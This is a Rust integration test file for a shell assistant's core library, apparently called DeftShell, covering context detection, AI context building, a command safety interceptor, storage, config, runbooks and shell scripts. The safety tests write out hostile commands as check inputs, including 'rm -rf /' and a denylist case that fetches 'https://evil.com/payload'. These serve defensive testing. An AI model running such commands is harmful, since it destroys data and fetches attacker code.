//! Integration tests for ds-core.
//!
//! These tests exercise the public API across module boundaries — context
//! detection feeding into AI context building, safety interceptor with
//! real configurations, database round-trips, config loading hierarchy,
//! runbook parsing and serialization, and shell script generation.

use std::collections::HashMap;
use std::path::{Path, PathBuf};

use ds_core::config::schema::{
    AiConfig, AiContextConfig, AiProviderConfig, DeftShellConfig, SafetyConfig,
};
use ds_core::config::ConfigLoader;
use ds_core::context::detector::ContextDetector;
use ds_core::runbook::parser::Runbook;
use ds_core::safety::interceptor::{CommandInterceptor, InterceptionContext};
use ds_core::storage::db::UsagePeriod;
use ds_core::storage::Database;
use tempfile::TempDir;

/// Path to the test fixtures directory, relative to the workspace root.
fn fixtures_dir() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .unwrap()
        .parent()
        .unwrap()
        .join("tests/fixtures")
}

// =========================================================================
// Context detection against fixture projects
// =========================================================================

mod context_detection {
    use super::*;

    /// Helper to compare language names case-insensitively.
    fn lang_eq(detected: Option<&str>, expected: &str) -> bool {
        detected.map_or(false, |d| d.eq_ignore_ascii_case(expected))
    }

    #[test]
    fn detect_nextjs_project() {
        let dir = fixtures_dir().join("nextjs-app");
        let profile = ContextDetector::detect(&dir).unwrap();

        assert!(lang_eq(
            profile.stack.primary_language.as_deref(),
            "typescript"
        ));
        assert!(profile.stack.framework.is_some());
        // Package manager requires a lockfile (package-lock.json, yarn.lock, etc.)
        // which the minimal fixture doesn't have.
        assert!(profile.scripts.contains_key("dev"));
        assert!(profile.scripts.contains_key("build"));
        assert!(profile.scripts.contains_key("test"));
    }

    #[test]
    fn detect_rust_project() {
        let dir = fixtures_dir().join("rust-project");
        let profile = ContextDetector::detect(&dir).unwrap();

        assert!(lang_eq(profile.stack.primary_language.as_deref(), "rust"));
        assert_eq!(profile.project.name, "sample-rust-app");
    }

    #[test]
    fn detect_python_django_project() {
        let dir = fixtures_dir().join("python-django");
        let profile = ContextDetector::detect(&dir).unwrap();

        assert!(lang_eq(profile.stack.primary_language.as_deref(), "python"));
        assert_eq!(profile.project.name, "django-app");
    }

    #[test]
    fn detect_go_project() {
        let dir = fixtures_dir().join("go-project");
        let profile = ContextDetector::detect(&dir).unwrap();

        assert!(lang_eq(profile.stack.primary_language.as_deref(), "go"));
    }

    #[test]
    fn detect_ruby_rails_project() {
        let dir = fixtures_dir().join("ruby-rails");
        let profile = ContextDetector::detect(&dir).unwrap();

        assert!(lang_eq(profile.stack.primary_language.as_deref(), "ruby"));
        assert!(profile.stack.framework.is_some());
    }

    #[test]
    fn detect_monorepo_turbo() {
        let dir = fixtures_dir().join("monorepo-turbo");
        let profile = ContextDetector::detect(&dir).unwrap();

        // Turbo monorepo should be detected as Node/JS project.
        assert!(
            lang_eq(profile.stack.primary_language.as_deref(), "javascript")
                || lang_eq(profile.stack.primary_language.as_deref(), "typescript")
        );
    }

    #[test]
    fn detect_empty_directory() {
        let tmp = tempfile::tempdir().unwrap();
        let profile = ContextDetector::detect(tmp.path()).unwrap();

        // Should return a valid but mostly-empty profile.
        assert!(profile.stack.primary_language.is_none());
        assert!(profile.stack.framework.is_none());
    }

    #[test]
    fn detect_nonexistent_directory_errors() {
        let result = ContextDetector::detect(Path::new("/nonexistent/path/12345"));
        // Should either error or return an empty profile, not panic.
        // The detector canonicalizes and falls back.
        assert!(result.is_ok() || result.is_err());
    }
}

// =========================================================================
// AI context builder with detected context
// =========================================================================

mod context_builder {
    use super::*;
    use ds_core::ai::context_builder::AiContextBuilder;

    #[test]
    fn build_context_from_nextjs_fixture() {
        let dir = fixtures_dir().join("nextjs-app");
        let profile = ContextDetector::detect(&dir).unwrap();
        let config = AiContextConfig::default();

        let context = AiContextBuilder::build(&profile, &dir, &config, 8000, None).unwrap();
        let lower = context.to_lowercase();

        // Should include stack profile info (case-insensitive).
        assert!(lower.contains("next") || lower.contains("typescript"));
        // Should include project files.
        assert!(context.contains("package.json"));
    }

    #[test]
    fn build_context_from_rust_fixture() {
        let dir = fixtures_dir().join("rust-project");
        let profile = ContextDetector::detect(&dir).unwrap();
        let config = AiContextConfig::default();

        let context = AiContextBuilder::build(&profile, &dir, &config, 8000, None).unwrap();
        let lower = context.to_lowercase();

        assert!(lower.contains("rust"));
        assert!(context.contains("Cargo.toml") || context.contains("sample-rust-app"));
    }

    #[test]
    fn build_context_respects_token_budget() {
        let dir = fixtures_dir().join("nextjs-app");
        let profile = ContextDetector::detect(&dir).unwrap();
        let config = AiContextConfig::default();

        // Very small token budget — context should still build but be truncated.
        let small_context = AiContextBuilder::build(&profile, &dir, &config, 100, None).unwrap();
        let large_context = AiContextBuilder::build(&profile, &dir, &config, 32000, None).unwrap();

        assert!(small_context.len() <= large_context.len());
    }

    #[test]
    fn build_context_includes_last_error() {
        let dir = fixtures_dir().join("rust-project");
        let profile = ContextDetector::detect(&dir).unwrap();
        let config = AiContextConfig::default();

        let context = AiContextBuilder::build(
            &profile,
            &dir,
            &config,
            8000,
            Some("error[E0308]: mismatched types"),
        )
        .unwrap();

        assert!(context.contains("E0308"));
    }

    #[test]
    fn build_context_excludes_env_files() {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::write(tmp.path().join(".env"), "SECRET_KEY=hunter2").unwrap();
        std::fs::write(tmp.path().join("package.json"), "{}").unwrap();

        let profile = ContextDetector::detect(tmp.path()).unwrap();
        let config = AiContextConfig::default();

        let context = AiContextBuilder::build(&profile, tmp.path(), &config, 8000, None).unwrap();

        // The .env file should be excluded by default.
        assert!(!context.contains("hunter2"));
    }
}

// =========================================================================
// Safety interceptor
// =========================================================================

mod safety {
    use super::*;
    use ds_core::safety::rules::RiskLevel;

    fn default_interceptor() -> CommandInterceptor {
        let config = SafetyConfig::default();
        CommandInterceptor::new(&config).unwrap()
    }

    fn default_context() -> InterceptionContext {
        InterceptionContext::default()
    }

    #[test]
    fn safe_commands_pass() {
        let interceptor = default_interceptor();
        let ctx = default_context();

        assert!(interceptor.check("ls -la", &ctx).is_none());
        assert!(interceptor.check("git status", &ctx).is_none());
        assert!(interceptor.check("cargo build", &ctx).is_none());
        assert!(interceptor.check("npm install", &ctx).is_none());
        assert!(interceptor.check("echo hello", &ctx).is_none());
    }

    #[test]
    fn critical_commands_detected() {
        let interceptor = default_interceptor();
        let ctx = default_context();

        let alert = interceptor.check("rm -rf /", &ctx);
        assert!(alert.is_some());
        let alert = alert.unwrap();
        assert_eq!(alert.level, RiskLevel::Critical);
    }

    #[test]
    fn git_force_push_detected() {
        let interceptor = default_interceptor();
        let ctx = default_context();

        let alert = interceptor.check("git push --force origin main", &ctx);
        assert!(alert.is_some());
    }

    #[test]
    fn production_context_elevates_risk() {
        let interceptor = default_interceptor();
        let ctx = InterceptionContext {
            is_production_env: true,
            current_branch: Some("main".to_string()),
            ..Default::default()
        };

        // A command that might be medium risk normally should be elevated.
        let alert_no_prod = interceptor.check("git push --force origin dev", &default_context());
        let alert_prod = interceptor.check("git push --force origin dev", &ctx);

        // Both should alert, but production context should have context_info.
        assert!(alert_no_prod.is_some());
        assert!(alert_prod.is_some());
        if let Some(a) = alert_prod {
            assert!(a.context_info.is_some());
        }
    }

    #[test]
    fn allowlist_bypasses_rules() {
        let mut config = SafetyConfig::default();
        config.allowlist = vec!["rm -rf /tmp/test".to_string()];
        let interceptor = CommandInterceptor::new(&config).unwrap();
        let ctx = default_context();

        // This specific command should be allowed.
        let alert = interceptor.check("rm -rf /tmp/test", &ctx);
        assert!(alert.is_none());
    }

    #[test]
    fn denylist_always_blocks() {
        let mut config = SafetyConfig::default();
        config.denylist = vec!["curl.*evil\\.com".to_string()];
        let interceptor = CommandInterceptor::new(&config).unwrap();
        let ctx = default_context();

        let alert = interceptor.check("curl https://evil.com/payload", &ctx);
        assert!(alert.is_some());
        let alert = alert.unwrap();
        assert_eq!(alert.level, RiskLevel::Critical);
    }

    #[test]
    fn disabled_safety_skips_all_checks() {
        let mut config = SafetyConfig::default();
        config.enabled = false;
        let interceptor = CommandInterceptor::new(&config).unwrap();
        let ctx = default_context();

        assert!(interceptor.check("rm -rf /", &ctx).is_none());
    }

    #[test]
    fn custom_rules_work() {
        let mut config = SafetyConfig::default();
        config.custom_rules = vec![ds_core::config::schema::CustomSafetyRule {
            pattern: "deploy.*production".to_string(),
            level: "critical".to_string(),
            message: "Production deployment requires approval".to_string(),
        }];
        let interceptor = CommandInterceptor::new(&config).unwrap();
        let ctx = default_context();

        let alert = interceptor.check("deploy --env production", &ctx);
        assert!(alert.is_some());
    }
}

// =========================================================================
// Database round-trips
// =========================================================================

mod database {
    use super::*;

    /// Open a fresh database in a temporary directory.
    fn temp_db() -> (Database, TempDir) {
        let tmp = TempDir::new().unwrap();
        let db = Database::open(&tmp.path().join("test.db")).unwrap();
        (db, tmp)
    }

    #[test]
    fn command_recording_and_retrieval() {
        let (db, _tmp) = temp_db();

        db.record_command("cargo build", "/project", Some(0), Some(5000))
            .unwrap();
        db.record_command("cargo test", "/project", Some(1), Some(3000))
            .unwrap();
        db.record_command("ls -la", "/other", Some(0), Some(10))
            .unwrap();

        let recent = db.get_recent_commands("/project", 10).unwrap();
        assert_eq!(recent.len(), 2);
        assert_eq!(recent[0].command, "cargo test"); // Most recent first.
    }

    #[test]
    fn command_stats_accuracy() {
        let (db, _tmp) = temp_db();

        db.record_command("cargo build", "/project", Some(0), Some(100))
            .unwrap();
        db.record_command("cargo build", "/project", Some(0), Some(200))
            .unwrap();
        db.record_command("cargo test", "/project", Some(1), Some(300))
            .unwrap();

        let stats = db.get_command_stats("/project").unwrap();
        assert_eq!(stats.total_commands, 3);
        assert_eq!(stats.unique_commands, 2);
        // 1 out of 3 had non-zero exit code.
        assert!((stats.error_rate - 1.0 / 3.0).abs() < 0.01);
    }

    #[test]
    fn context_cache_roundtrip() {
        let (db, _tmp) = temp_db();

        let ctx_json = r#"{"language":"Rust","framework":"Axum"}"#;
        db.cache_context("/project", ctx_json).unwrap();

        let cached = db.get_cached_context("/project").unwrap();
        assert!(cached.is_some());
        assert_eq!(cached.unwrap().context_json, ctx_json);
    }

    #[test]
    fn context_cache_upsert_replaces() {
        let (db, _tmp) = temp_db();

        db.cache_context("/project", "old").unwrap();
        db.cache_context("/project", "new").unwrap();

        let cached = db.get_cached_context("/project").unwrap().unwrap();
        assert_eq!(cached.context_json, "new");
    }

    #[test]
    fn ai_usage_recording() {
        let (db, _tmp) = temp_db();

        db.record_ai_usage("anthropic", 100, 200, 0.05).unwrap();
        db.record_ai_usage("openai", 50, 100, 0.02).unwrap();
        db.record_ai_usage("anthropic", 80, 150, 0.04).unwrap();

        let stats = db.get_ai_usage(UsagePeriod::All).unwrap();
        assert_eq!(stats.total_tokens_in, 230);
        assert_eq!(stats.total_tokens_out, 450);
        assert!((stats.total_cost - 0.11).abs() < 0.001);
        assert!(stats.by_provider.contains_key("anthropic"));
        assert!(stats.by_provider.contains_key("openai"));
    }

    #[test]
    fn recent_commands_limit() {
        let (db, _tmp) = temp_db();

        for i in 0..20 {
            db.record_command(&format!("cmd-{}", i), "/project", Some(0), Some(10))
                .unwrap();
        }

        let recent = db.get_recent_commands("/project", 5).unwrap();
        assert_eq!(recent.len(), 5);
        // Most recent first.
        assert_eq!(recent[0].command, "cmd-19");
    }

    #[test]
    fn empty_database_returns_empty_results() {
        let (db, _tmp) = temp_db();

        let recent = db.get_recent_commands("/project", 10).unwrap();
        assert!(recent.is_empty());

        let cached = db.get_cached_context("/project").unwrap();
        assert!(cached.is_none());

        let stats = db.get_command_stats("/project").unwrap();
        assert_eq!(stats.total_commands, 0);
    }
}

// =========================================================================
// Config loading
// =========================================================================

mod config {
    use super::*;

    #[test]
    fn default_config_is_valid() {
        let config = DeftShellConfig::default();
        assert!(config.safety.enabled);
        assert_eq!(config.ai.default_provider, "ollama");
        assert_eq!(config.ai.limits.daily_token_limit, 100_000);
        assert_eq!(config.ai.limits.per_request_token_limit, 8000);
    }

    #[test]
    fn load_config_with_nonexistent_project_dir() {
        let config = ConfigLoader::load(Some(Path::new("/nonexistent/path")));
        assert!(config.is_ok());
    }

    #[test]
    fn load_config_with_none_project_dir() {
        let config = ConfigLoader::load(None);
        assert!(config.is_ok());
    }

    #[test]
    fn config_serialization_roundtrip() {
        let config = DeftShellConfig::default();
        let toml_str = toml::to_string_pretty(&config).unwrap();
        let parsed: DeftShellConfig = toml::from_str(&toml_str).unwrap();

        assert_eq!(config.ai.default_provider, parsed.ai.default_provider);
        assert_eq!(config.safety.enabled, parsed.safety.enabled);
    }

    #[test]
    fn project_config_with_custom_rules() {
        let toml_str = r#"
[project]
name = "test-project"
team = "platform"

[ai.context]
exclude_files = ["*.secret"]
include_files = ["custom.yaml"]

[safety]
custom_rules = [
    { pattern = "deploy prod", level = "critical", message = "Needs approval" }
]

[scripts]
deploy = "make deploy"
test = "cargo test"

[aliases]
d = "deploy"
"#;
        let config: ds_core::config::schema::ProjectConfig = toml::from_str(toml_str).unwrap();
        assert_eq!(config.project.name, Some("test-project".to_string()));
        assert_eq!(
            config.scripts.get("deploy"),
            Some(&"make deploy".to_string())
        );
        assert!(!config.safety.custom_rules.is_empty());
    }

    #[test]
    fn partial_config_fills_defaults() {
        let toml_str = r#"
[ai]
default_provider = "anthropic"
"#;
        let config: DeftShellConfig = toml::from_str(toml_str).unwrap();
        assert_eq!(config.ai.default_provider, "anthropic");
        // Everything else should have defaults.
        assert!(config.safety.enabled);
        assert_eq!(config.ai.limits.per_request_token_limit, 8000);
    }
}

// =========================================================================
// Runbook parsing and serialization
// =========================================================================

mod runbooks {
    use super::*;

    #[test]
    fn parse_full_runbook() {
        let toml_str = r#"
[runbook]
name = "deploy-app"
title = "Deploy Application"
description = "Standard deployment procedure"
author = "Team Lead"
version = "1.0.0"
tags = ["deployment", "production"]
estimated_time = "10 minutes"
requires = ["docker", "kubectl"]

[[steps]]
title = "Build Docker image"
command = "docker build -t app:{{version}} ."
description = "Build the production Docker image"
confirm = true
variables = ["version"]

[[steps]]
title = "Run tests"
command = "cargo test"
confirm = false
on_failure = "abort"

[[steps]]
title = "Deploy to Kubernetes"
command = "kubectl apply -f k8s/"
confirm = true
on_failure = "retry"
fallback_command = "kubectl rollout undo deployment/app"
"#;
        let rb = Runbook::parse_toml(toml_str).unwrap();

        assert_eq!(rb.runbook.name, "deploy-app");
        assert_eq!(rb.runbook.tags.len(), 2);
        assert_eq!(rb.runbook.requires.len(), 2);
        assert_eq!(rb.steps.len(), 3);
        assert!(rb.steps[0].confirm);
        assert!(!rb.steps[1].confirm);
        assert_eq!(rb.steps[0].variables, vec!["version"]);
        assert!(rb.steps[2].fallback_command.is_some());
    }

    #[test]
    fn runbook_serialization_roundtrip() {
        let toml_str = r#"
[runbook]
name = "test"
title = "Test Runbook"

[[steps]]
title = "Step 1"
command = "echo hello"
confirm = false
"#;
        let rb = Runbook::parse_toml(toml_str).unwrap();
        let serialized = rb.to_toml().unwrap();
        let deserialized = Runbook::parse_toml(&serialized).unwrap();

        assert_eq!(rb.runbook.name, deserialized.runbook.name);
        assert_eq!(rb.steps.len(), deserialized.steps.len());
    }

    #[test]
    fn runbook_variable_substitution() {
        let mut vars = HashMap::new();
        vars.insert("version".to_string(), "2.1.0".to_string());
        vars.insert("env".to_string(), "production".to_string());

        let result = Runbook::substitute_variables("deploy {{version}} to {{env}}", &vars);
        assert_eq!(result, "deploy 2.1.0 to production");
    }

    #[test]
    fn runbook_variable_substitution_missing_var() {
        let vars = HashMap::new();
        let result = Runbook::substitute_variables("echo {{missing}}", &vars);
        // Missing variables should be left as-is.
        assert_eq!(result, "echo {{missing}}");
    }

    #[test]
    fn runbook_save_and_load() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("test.toml");

        let toml_str = r#"
[runbook]
name = "save-test"
title = "Save Test"

[[steps]]
title = "Step 1"
command = "echo hello"
confirm = false
"#;
        let rb = Runbook::parse_toml(toml_str).unwrap();
        rb.save(&path).unwrap();

        let loaded = Runbook::from_file(&path).unwrap();
        assert_eq!(loaded.runbook.name, "save-test");
        assert_eq!(loaded.steps.len(), 1);
    }

    #[test]
    fn list_runbooks_in_directory() {
        let tmp = tempfile::tempdir().unwrap();

        // Write two runbooks.
        for name in &["alpha", "beta"] {
            let rb_str = format!(
                r#"
[runbook]
name = "{name}"
title = "Runbook {name}"

[[steps]]
title = "Step"
command = "echo {name}"
confirm = false
"#
            );
            std::fs::write(tmp.path().join(format!("{name}.toml")), rb_str).unwrap();
        }

        // Write a non-TOML file that should be ignored.
        std::fs::write(tmp.path().join("readme.md"), "# Runbooks").unwrap();

        let metas = Runbook::list_runbooks(tmp.path()).unwrap();
        assert_eq!(metas.len(), 2);
        assert_eq!(metas[0].name, "alpha"); // Sorted.
        assert_eq!(metas[1].name, "beta");
    }

    #[test]
    fn list_runbooks_empty_dir() {
        let tmp = tempfile::tempdir().unwrap();
        let metas = Runbook::list_runbooks(tmp.path()).unwrap();
        assert!(metas.is_empty());
    }

    #[test]
    fn list_runbooks_nonexistent_dir() {
        let metas = Runbook::list_runbooks(Path::new("/nonexistent/runbooks"));
        assert!(metas.is_ok());
        assert!(metas.unwrap().is_empty());
    }
}

// =========================================================================
// AI gateway provider registration
// =========================================================================

mod gateway {
    use super::*;
    use ds_core::ai::gateway::AiGateway;

    #[test]
    fn gateway_registers_all_known_providers() {
        let config = AiConfig::default();
        let gateway = AiGateway::new(&config);

        let providers = gateway.list_providers();
        let names: Vec<&str> = providers.iter().map(|(n, _)| *n).collect();

        assert!(names.contains(&"anthropic"));
        assert!(names.contains(&"openai"));
        assert!(names.contains(&"ollama"));
        assert!(names.contains(&"copilot"));
        assert!(names.contains(&"bedrock"));
        assert!(names.contains(&"gemini"));
    }

    #[test]
    fn gateway_skips_explicitly_disabled_providers() {
        let mut config = AiConfig::default();
        let mut disabled = AiProviderConfig::default();
        disabled.enabled = false;
        config.providers.insert("anthropic".to_string(), disabled);

        let gateway = AiGateway::new(&config);
        let providers = gateway.list_providers();
        let names: Vec<&str> = providers.iter().map(|(n, _)| *n).collect();

        assert!(!names.contains(&"anthropic"));
        assert!(names.contains(&"openai")); // Others still registered.
    }

    #[test]
    fn gateway_set_provider_changes_default() {
        let mut config = AiConfig::default();
        config.default_provider = "ollama".to_string();

        let mut gateway = AiGateway::new(&config);

        // Verify we can look up the default.
        assert!(gateway.get_provider("ollama").is_some());

        // Override.
        gateway.set_provider("anthropic");
        assert!(gateway.get_provider("anthropic").is_some());
    }
}

// =========================================================================
// Shell init script generation
// =========================================================================

mod shell_scripts {
    #[test]
    fn zsh_script_has_guard() {
        let script = ds_core::shell::zsh::init_script();
        assert!(script.contains("_DEFTSHELL_LOADED"));
        assert!(script.contains("add-zsh-hook"));
    }

    #[test]
    fn zsh_script_captures_command_in_preexec() {
        let script = ds_core::shell::zsh::init_script();
        // After our fix, preexec should save the command.
        assert!(script.contains("_DEFTSHELL_LAST_CMD"));
    }

    #[test]
    fn bash_script_has_guard() {
        let script = ds_core::shell::bash::init_script();
        assert!(script.contains("_DEFTSHELL_LOADED"));
        assert!(script.contains("PROMPT_COMMAND"));
    }

    #[test]
    fn bash_script_has_preexec_ready_guard() {
        let script = ds_core::shell::bash::init_script();
        // After our fix, bash should have the preexec ready guard.
        assert!(script.contains("_DEFTSHELL_PREEXEC_READY"));
    }

    #[test]
    fn fish_script_has_guard() {
        let script = ds_core::shell::fish::init_script();
        assert!(script.contains("_DEFTSHELL_LOADED"));
        assert!(script.contains("fish_prompt"));
    }

    #[test]
    fn fish_script_captures_exit_code_correctly() {
        let script = ds_core::shell::fish::init_script();
        // After our fix, fish should use _deftshell_last_exit.
        assert!(script.contains("_deftshell_last_exit"));
    }

    #[test]
    fn all_shell_scripts_have_safety_check() {
        for script in &[
            ds_core::shell::zsh::init_script(),
            ds_core::shell::bash::init_script(),
            ds_core::shell::fish::init_script(),
        ] {
            assert!(
                script.contains("safety-check"),
                "Shell script missing safety-check integration"
            );
        }
    }

    #[test]
    fn all_shell_scripts_have_context_detection() {
        for script in &[
            ds_core::shell::zsh::init_script(),
            ds_core::shell::bash::init_script(),
            ds_core::shell::fish::init_script(),
        ] {
            assert!(
                script.contains("context --detect"),
                "Shell script missing context detection"
            );
        }
    }

    #[test]
    fn all_shell_scripts_have_alias_loading() {
        for script in &[
            ds_core::shell::zsh::init_script(),
            ds_core::shell::bash::init_script(),
            ds_core::shell::fish::init_script(),
        ] {
            assert!(
                script.contains("alias --export"),
                "Shell script missing alias loading"
            );
        }
    }
}

// =========================================================================
// End-to-end: detection → context building → no secrets leaked
// =========================================================================

mod e2e {
    use super::*;
    use ds_core::ai::context_builder::AiContextBuilder;

    #[test]
    fn secrets_never_leak_to_ai_context() {
        let tmp = tempfile::tempdir().unwrap();

        // Create files with secrets.
        std::fs::write(tmp.path().join(".env"), "DB_PASSWORD=supersecret123").unwrap();
        std::fs::write(tmp.path().join(".env.local"), "API_KEY=sk-abc123").unwrap();
        std::fs::write(
            tmp.path().join("server.key"),
            "-----BEGIN RSA PRIVATE KEY-----",
        )
        .unwrap();
        std::fs::write(tmp.path().join("cert.pem"), "-----BEGIN CERTIFICATE-----").unwrap();

        // Also create a normal project file.
        std::fs::write(
            tmp.path().join("package.json"),
            r#"{"name":"test","scripts":{"dev":"node app.js"}}"#,
        )
        .unwrap();

        let profile = ContextDetector::detect(tmp.path()).unwrap();
        let config = AiContextConfig::default();

        let context = AiContextBuilder::build(&profile, tmp.path(), &config, 8000, None).unwrap();

        // Secrets should never appear.
        assert!(!context.contains("supersecret123"), "DB_PASSWORD leaked");
        assert!(!context.contains("sk-abc123"), "API_KEY leaked");
        assert!(
            !context.contains("BEGIN RSA PRIVATE KEY"),
            "Private key leaked"
        );
        assert!(!context.contains("BEGIN CERTIFICATE"), "Certificate leaked");

        // But normal project info should still be present.
        assert!(context.contains("package.json") || context.contains("test"));
    }

    #[test]
    fn detection_and_context_for_all_fixture_types() {
        let fixture_dir = fixtures_dir();
        let config = AiContextConfig::default();

        for entry in std::fs::read_dir(&fixture_dir).unwrap() {
            let entry = entry.unwrap();
            if !entry.path().is_dir() {
                continue;
            }

            let dir = entry.path();
            let dir_name = dir.file_name().unwrap().to_string_lossy().to_string();

            // Detection should succeed for all fixtures.
            let profile = ContextDetector::detect(&dir)
                .unwrap_or_else(|e| panic!("Detection failed for {dir_name}: {e}"));

            // Context building should succeed for all fixtures.
            let context = AiContextBuilder::build(&profile, &dir, &config, 8000, None)
                .unwrap_or_else(|e| panic!("Context build failed for {dir_name}: {e}"));

            // Context should be non-empty for all fixtures (they all have files).
            assert!(!context.is_empty(), "Empty context for fixture: {dir_name}");
        }
    }
}
